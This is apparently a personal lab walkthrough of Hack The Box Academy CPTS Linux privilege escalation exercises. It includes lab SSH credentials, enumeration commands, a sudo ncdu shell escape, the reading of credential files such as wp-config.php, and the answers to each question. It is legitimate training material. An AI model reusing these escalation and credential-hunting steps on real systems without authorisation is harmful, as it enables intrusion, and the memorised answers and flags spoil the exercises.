---
title: CPTS labs - 24 Linux Privilege Escalation
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - certification
  - CPTS
  - labs
---
# CPTS labs - 24 Linux Privilege Escalation

Module: [Linux Privilege Escalation](https://academy.hackthebox.com/module/51)

### Information Gathering

SSH to  with user "htb-student" and password "HTB_@cademy_stdnt!".
Enumerate the Linux environment and look for interesting files that might contain sensitive data. Submit the flag as the answer.

```
ssh htb@$ip
sudo -l
sudo -u lab_adm /bin/ncdu
# Escape to gain a shell with keyboard "b"

# After enumerating for a while
cd /home/labadm
cat .viminfo
# Note the file /usr/lib/int-check.sh within the .viminfo
cat /usr/lib/int-check.sh
```

Results: HTB{1nt3rn4l_5cr1p7_l34k}


**What is the latest Python version that is installed on the target?**

```
ls -la /etc/python* 
```

Results: 3.11


SSH to (ACADEMY-LPE-NIX02) with user "htb-student" and password "Academy_LLPE!". Find the WordPress database password.

```
ssh htb@$ip
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
# Note  /var/www/html/wp-config.php listed
cat  /var/www/html/wp-config.php
```

Results: W0rdpr3ss_sekur1ty!


### Environment-based Privilege Escalation

**SSH to (ACADEMY-LPE-NIX02) with user "htb-student" and password "Academy_LLPE!". Review the PATH of the htb-student user. What non-default directory is part of the user's PATH?**

```
echo $PATH
# Output: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/tmp
```

Results: /tmp

